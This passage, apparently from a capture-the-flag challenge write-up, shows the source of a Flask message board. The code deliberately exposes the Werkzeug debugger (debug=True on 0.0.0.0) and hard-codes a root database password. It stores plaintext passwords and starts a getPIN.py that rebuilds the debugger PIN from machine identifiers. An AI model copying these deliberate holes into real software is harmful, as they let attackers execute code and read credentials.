<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    you are not logged in
    &lt;br>
    &lt;a href='login'>login now&lt;/a>
    '''</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
            msg <span class="token operator">=</span> getMsgList<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'guest'</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> msg<span class="token punctuation">:</span>
                    <span class="token comment"># remove the message send by other user on private condition</span>
                    <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                        msg<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>
            username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
            nowtime <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'private'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
                private <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                private <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">if</span> message <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("invalid input");window.location.href="/index";&lt;/script>'''</span>
            dataSql<span class="token punctuation">.</span>uploadMessage<span class="token punctuation">(</span>username<span class="token punctuation">,</span> message<span class="token punctuation">,</span> nowtime<span class="token punctuation">,</span> private<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("upload successfully");window.location.href="/index";&lt;/script>'''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        psg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'psg'</span><span class="token punctuation">)</span>
        msg <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>showMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            h1 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
            h1<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            h2 <span class="token operator">=</span> h1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'root'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> h2 <span class="token operator">==</span> psg<span class="token punctuation">:</span>
                dataSql<span class="token punctuation">.</span>deleteMessage<span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("Permission denied");window.location.href="/index";&lt;/script>'''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("login first");window.location.href="/index";&lt;/script>'''</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index/api/getMessage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> password <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'invalid input'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token keyword">not</span> dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'username or password incorrect'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">elif</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        msg <span class="token operator">=</span> getMsgList<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>getPower<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'guest'</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> msg<span class="token punctuation">:</span>
                <span class="token comment"># remove the message send by other user on private condition</span>
                <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                    msg<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">return</span> msg


<span class="token keyword">def</span> <span class="token function">getMsgList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    msg <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>showMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        h1 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        h1<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span>h1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> msg


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>dataSql.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql
<span class="token keyword">import</span> time
<span class="token keyword">import</span> getPIN

pin <span class="token operator">=</span> getPIN<span class="token punctuation">.</span>get_pin<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Database</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>max_retries <span class="token operator">=</span> max_retries
        self<span class="token punctuation">.</span>db <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>db <span class="token operator">=</span> self<span class="token punctuation">.</span>connect_to_database<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>db<span class="token punctuation">,</span> self<span class="token punctuation">.</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_val<span class="token punctuation">,</span> exc_tb<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>db <span class="token keyword">and</span> self<span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">connect_to_database</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        retries <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> retries <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>max_retries<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
                    host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库地址</span>
                    port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库端口</span>
                    user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库用户名</span>
                    passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库密码</span>
                    database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库名</span>
                    charset<span class="token operator">=</span><span class="token string">'utf8'</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">return</span> db
            <span class="token keyword">except</span> pymysql<span class="token punctuation">.</span>Error <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                retries <span class="token operator">+=</span> <span class="token number">1</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>retries<span class="token punctuation">&#125;</span></span><span class="token string"> failed. Retrying in 5 seconds..."</span></span><span class="token punctuation">)</span>
                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Failed to connect to the database after maximum retries."</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">canLogin</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select password from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">:</span>
            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select username from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            sql <span class="token operator">=</span> <span class="token string">'insert into users (id,username,password,power) values (%s,%s,%s,%s)'</span>
            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">)</span>
            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">changePassword</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>oldPassword<span class="token punctuation">,</span>newPassword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select password from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">:</span>
            <span class="token keyword">if</span> oldPassword <span class="token operator">==</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                sql <span class="token operator">=</span> <span class="token string">'update users set password=%s where username=%s'</span>
                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span>newPassword<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>
                db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"wrong password"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"username doesn't exist."</span>

<span class="token keyword">def</span> <span class="token function">uploadMessage</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>message<span class="token punctuation">,</span>nowtime<span class="token punctuation">,</span>private<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'insert into message (username,data,time,private) values (%s,%s,%s,%s)'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span>message<span class="token punctuation">,</span>nowtime<span class="token punctuation">,</span>private<span class="token punctuation">)</span><span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select * from message'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'128-243-397'</span><span class="token punctuation">,</span> pin<span class="token punctuation">)</span> <span class="token keyword">for</span> elem <span class="token keyword">in</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">]</span>
        <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">usersName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select * from users'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getPower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select power from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">deleteMessage</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>pubTime<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'delete from message where username=%s and time=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>pubTime<span class="token punctuation">)</span><span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>getPIN.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
<span class="token keyword">import</span> uuid
<span class="token keyword">def</span> <span class="token function">get_pin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">'ctf'</span><span class="token comment"># username  /proc/self/environ</span>
        <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>
        <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
        <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span>
    <span class="token punctuation">]</span>
    uuid1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    linux <span class="token operator">=</span> <span class="token string">b""</span>

        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
    <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
